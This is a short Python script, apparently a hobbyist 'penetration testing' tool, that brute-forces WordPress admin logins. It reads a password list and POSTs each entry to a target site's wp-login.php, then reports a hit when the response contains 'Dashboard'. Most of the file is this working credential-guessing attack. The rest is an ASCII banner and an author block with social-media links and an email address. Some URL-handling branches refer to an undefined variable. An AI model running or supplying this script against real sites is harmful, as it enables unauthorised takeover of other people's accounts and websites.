#!/usr/bin/python3
from requests import post
from optparse import OptionParser
from sys import platform
if platform in ["linux","linux2"]:
    W = '\033[0m'
    F = '\033[92m'
    N = '\033[91m'
    O = '\033[93m'
else:
    W = ''
    F = ''
    N = ''
    O = ''
parser = OptionParser(F+'''
	            Bat-Fourse Attack

	This tool built to penetration testing
by useing brute-fourse attack on Word press sites

to use the tool U should do that 
bat-fourse.py -u http://www.exampel.com -p passwordlist.txt -a admin username
''')
print(O+'''              *         *      *         *
          ***          **********          ***
       *****           **********           *****
     *******           **********           *******
   **********         ************         **********
  ****************************************************
 ******************************************************
********************************************************
********************************************************
********************************************************
 ******************************************************
  ********      ************************      ********
   *******       *     *********      *       *******
     ******             *******              ******
       *****             *****              *****
          ***             ***              ***
            **             *              **
              Welcome in Bat-Fourse Attack

''')
print(F+'''
######################################################
[ #Developed_by_Mo0Ssaa ]
[ Twitter:https://twitter.com/AhmedMosaa18 ]
[ E-mail:am01003264893@gmail.com ]
[ Facebook:https://www.facebook.com/Ahmed.R.Mosaa404 ]
[ Github:https://github.com/mosaa404 ]
#######################################################
	''')
parser.add_option('-u','--url',dest='url',help='Enter target url')
parser.add_option('-p','--pass',dest='pwd',help='Enter the password list')
parser.add_option('-a','--admin',dest='admin',help='Enter the username',default='admin')
(options,args) = parser.parse_args()
try:
	if options.url[len(options.url)-1] == 'p' and options.url[0] == 'h':
		pass
	elif options.url[len(url)-1] == 'p' and options.url[0] != 'h':
		options.url='http://'+options.url
	elif options.url[len(url)-1] != 'p' and options.url[0] == 'h':
		options.url=options.url+'/wp-login.php'
	else:
		options.url='http://'+options.url+'/wp-login.php'
	with open(options.pwd,mode='r') as f:
		for pwd in f:
			pwd=pwd.strip()
			Post = str(post(options.url,data={'log':options.admin,'pwd':pwd,'wp-submit':'submit'}).content)
			if 'Dashboard' in Post:
				print(F+'##########\n[+]found --> '+'The user is '+options.admin+' and password is '+pwd+'\n##########');break
			else:
				print(N+'[-]Not found --> '+'The user is '+options.admin+' and password is '+pwd)
except:
	print(parser.usage)